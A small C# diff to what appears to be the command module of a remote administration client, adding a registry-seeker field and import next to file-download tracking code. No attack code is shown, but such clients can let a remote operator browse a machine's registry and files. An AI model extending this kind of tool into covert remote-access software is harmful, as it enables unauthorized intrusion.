@@ -1,5 +1,6 @@
 ﻿using System.Collections.Generic;
 using System.Threading;
+using xClient.Core.Registry;
 using xClient.Core.Utilities;
 
 namespace xClient.Core.Commands
@@ -12,5 +13,6 @@ namespace xClient.Core.Commands
         private static Dictionary<int, string> _canceledDownloads = new Dictionary<int, string>();
         private const string DELIMITER = "$E$";
         private static readonly Semaphore _limitThreads = new Semaphore(2, 2); // maximum simultaneous file downloads
+        public static RegistrySeeker seeker;
     }
 }
